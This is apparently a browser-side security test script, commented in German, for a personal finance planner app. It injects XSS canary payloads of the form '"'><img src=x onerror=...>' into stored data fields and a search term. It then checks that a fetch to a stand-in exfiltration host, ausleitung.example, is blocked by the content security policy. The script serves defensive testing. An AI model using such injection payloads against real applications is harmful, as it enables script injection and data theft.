// Sicherheit: echte Daten mit Gift-Einträgen laden, alle Ansichten durchklicken, ausgeführtes Fremd-Script zählen.
// Zweitens: „Kurse aktualisieren“ darf kein Script von fremden Servern nachladen. Wird VOR store.js eingebunden.
(function () {
  var errs = [], hits = {}, fields = [], step = 'start', foreign = [], viol = [];
  document.addEventListener('securitypolicyviolation', function (e) { viol.push(e.effectiveDirective + ' ' + e.blockedURI); });
  window.addEventListener('error', function (e) { if (e.message) errs.push(step + ': ' + e.message + ' @' + (e.filename || '').split('/').pop() + ':' + e.lineno); });
  window.__x = function (n, el) {
    var f = fields[n] || ('#' + n), w = where(el), k = step + (w ? ' @' + w : '');
    (hits[f] = hits[f] || []).indexOf(k) < 0 && hits[f].push(k);
  };
  function where(el) { var a = []; for (var e = el && el.parentNode; e && e.nodeType === 1 && a.length < 3; e = e.parentNode) { if (e.id) a.push('#' + e.id); else if (!a.length && e.className) a.push('.' + String(e.className).split(' ')[0]); } return a.join('<'); }
  function gift(label) { fields.push(label); var n = fields.length - 1; return '"\'><img src=x onerror=__x(' + n + ',this)>'; }
  function vergiften(o, key, label) { if (o && o[key] != null) o[key] = String(o[key]) + gift(label); }
  function farbe(o, label) { if (o) o.color = '#123456' + gift(label); }

  localStorage.clear();
  var st = JSON.parse(JSON.stringify(window.__REAL.store || window.__REAL));
  st.settings.azureSync.enabled = false;
  (st.persons || []).forEach(function (p, i) { vergiften(p, 'name', 'Person.name ' + i); });
  (st.categories || []).forEach(function (c) { vergiften(c, 'name', 'Kategorie.name'); farbe(c, 'Kategorie.color'); });
  (st.objects || []).forEach(function (o) { vergiften(o, 'name', 'Objekt.name'); vergiften(o, 'description', 'Objekt.description'); farbe(o, 'Objekt.color'); });
  (st.recurring || []).forEach(function (r) { vergiften(r, 'name', 'Fixkosten.name'); });
  (st.transactions || []).forEach(function (t, i) {
    if (i % 7) return;
    t.rawName = (t.rawName || 'x') + gift('Buchung.rawName');
    t.note = (t.note || 'x') + gift('Buchung.note');
  });
  (st.assets || []).forEach(function (a) { vergiften(a, 'name', 'Anlage.name'); vergiften(a, 'isin', 'Anlage.isin'); vergiften(a, 'wkn', 'Anlage.wkn'); vergiften(a, 'ticker', 'Anlage.ticker'); });
  (st.freistellungsauftraege || []).forEach(function (f) { vergiften(f, 'institution', 'FSA.institution'); vergiften(f, 'note', 'FSA.note'); });
  (st.currencies || []).forEach(function (c) { if (c.code !== 'EUR') { vergiften(c, 'name', 'Waehrung.name'); vergiften(c, 'symbol', 'Waehrung.symbol'); } });
  if (st.espp && st.espp.settings) vergiften(st.espp.settings, 'ticker', 'ESPP.ticker');
  Object.keys((st.retirement && st.retirement.profiles) || {}).forEach(function (k) {
    (st.retirement.profiles[k].weitereRentenversicherungen || []).forEach(function (w) { vergiften(w, 'name', 'Rente.weitere.name'); });
  });
  (st.log || []).slice(-5).forEach(function (l) { vergiften(l, 'level', 'Log.level'); vergiften(l, 'msg', 'Log.msg'); });
  localStorage.setItem('finanzplaner_v3', JSON.stringify(st));

  // fremde Scripte beobachten (eigene Dateien und das SRI-gesicherte jsdelivr sind erlaubt)
  new MutationObserver(function (ms) {
    ms.forEach(function (m) {
      [].forEach.call(m.addedNodes, function (n) {
        if (n.tagName !== 'SCRIPT' || !n.src) return;
        var u = new URL(n.src, location.href);
        if (u.protocol !== 'file:' && u.origin !== location.origin && u.host !== 'cdn.jsdelivr.net') foreign.push(u.host);
      });
    });
  }).observe(document.documentElement, { childList: true, subtree: true });

  function first(a) { return a && a.length ? a[0] : null; }
  window.addEventListener('load', function () {
    var S = FP.Store.get(), steps = [];
    function add(label, fn) { steps.push([label, fn]); }
    'home eingabe auswertung budget cashflow reports objekte fixkosten gehalt vermoegen rente einstellungen mehr'.split(' ')
      .forEach(function (t) { add('Tab ' + t, function () { nav(t); }); });
    ['verlauf', 'stichtag', 'rente', 'haushalt'].forEach(function (t) {
      add('Rente ' + t, function () { nav('rente'); rpSelectTab(t); });
    });
    add('Rente Person 2', function () { nav('rente'); rpS.person = 'person_2'; rpRenderMain(); rpS.person = 'person_1'; });
    ['gruppen', 'kategorien', 'objekte'].forEach(function (v) {
      add('Uebersicht ' + v, function () { nav('auswertung'); avS.katView = v; avS.detail = null; avRender(); });
    });
    add('Kategorie-Detail', function () { avS.detail = { id: S.categories[0].id, objId: null }; avRender(); avS.detail = null; });
    S.objects.forEach(function (o) { add('Objekt-Detail', function () { nav('objekte'); obRenderDetail(o.id); }); });
    ['x', 'img', 'a', '<img src=x onerror=__x(' + (fields.push('Suchbegriff') - 1) + ')>'].forEach(function (q) {
      add('Suche ' + q.slice(0, 5), function () { srSearch(q); });
    });
    if (window.ST_MENU) ST_MENU.forEach(function (g) { g.items.forEach(function (it) { add('Einstellungen ' + it.k, function () { nav('einstellungen'); stOpen(it.k); }); }); });
    add('Log', function () { stOpenLog(); });
    add('Kategorie bearbeiten', function () { stEditCat(S.categories[0].id); });
    add('Objekt bearbeiten', function () { stEditObj(S.objects[0].id); });
    S.currencies.forEach(function (c) { if (c.code !== 'EUR') add('Kurs ' + c.code, function () { stOpenRate(c.code); }); });
    add('Kategorie-Modal', function () { openKatModal(); });
    add('Buchung bearbeiten', function () { editTx(S.transactions[S.transactions.length - 1].id); });
    add('Fixkosten neu', function () { nav('fixkosten'); fkOpenNew(); });
    add('Fixkosten bearbeiten', function () { fkOpenEdit(S.recurring[0].id); });
    add('Fixkosten Betrag ab', function () { fkOpenSplit(S.recurring[0].id); });
    add('FSA', function () { nav('vermoegen'); vmOpenFsa(); });
    add('Anlage neu', function () { vmOpenNewAsset(); });
    S.assets.forEach(function (a) { add('Anlage bearbeiten', function () { vmEditAsset(a.id); }); });
    add('ESPP neu', function () { esppOpenNew(); });
    if (first(S.espp && S.espp.zyklen)) add('ESPP Zyklus', function () { esppEditZyklus(S.espp.zyklen[0].id); });
    add('Budget neu', function () { nav('budget'); bgtOpenAdd(); });
    add('Budget bearbeiten', function () { bgtStartEdit(S.categories[0].id); });
    // CSP: Abruf an fremden Server muss blockiert werden; Excel-Bibliothek lädt mit Prüfsumme
    add('CSP fremder Server', function () {
      window.__cspProbe = 'offen';
      fetch('https://ausleitung.example/x?d=1').then(function () { window.__cspProbe = 'durchgelassen'; }, function () {});
    });
    add('Excel-Bibliothek', function () {
      window.__xlsx = 'laedt';
      _loadXLSX(function () { window.__xlsx = (window.XLSX && XLSX.version) || 'ohne XLSX'; }, function () { window.__xlsx = 'Ladefehler'; });
    });
    // Kurse: fetch beantwortet sofort mit Schein-Kursen, damit kein echter Abruf läuft
    add('Kurse aktualisieren', function () {
      var r = { USD: 1.1, GBP: 0.9, CHF: 0.95, JPY: 160, SEK: 11, NOK: 11, DKK: 7.4 };
      window.fetch = function () { return Promise.resolve({ ok: true, status: 200, json: function () { return Promise.resolve({ rates: r, eur: r }); } }); };
      nav('einstellungen'); stUpdateRates();
    });

    var i = 0;
    (function next() {
      if (i < steps.length) {
        step = steps[i][0];
        try { steps[i][1](); } catch (e) { errs.push(step + ': ' + e.message); }
        i++; setTimeout(next, 120);
        return;
      }
      setTimeout(function () {
        var csp = viol.filter(function (v) { return v.indexOf('ausleitung.example') >= 0; }).length > 0 && window.__cspProbe !== 'durchgelassen';
        var other = viol.filter(function (v) { return v.indexOf('ausleitung.example') < 0; });
        var xok = window.__xlsx === '0.20.3';
        var hitList = Object.keys(hits).map(function (f) { return f + ' [' + hits[f].slice(0, 12).join(', ') + ']'; });
        var pre = document.createElement('pre'); pre.id = 'out';
        pre.textContent = JSON.stringify({
          pass: hitList.length === 0 && foreign.length === 0 && errs.length === 0 && csp && !other.length && xok,
          info: steps.length + ' Ansichten, ' + fields.length + ' Gift-Eintraege, ' + hitList.length + ' Felder ausgefuehrt, fremde Scripte: ' + foreign.length + ', CSP sperrt: ' + (csp ? 'ja' : 'NEIN') + ', XLSX: ' + window.__xlsx,
          errors: hitList.map(function (h) { return 'XSS ' + h; }).concat(foreign.map(function (h) { return 'Fremdes Script ' + h; })).concat(other.map(function (v) { return 'CSP blockiert Erlaubtes: ' + v; })).concat(errs)
        });
        document.body.appendChild(pre);
      }, 1500);
    })();
  });
})();
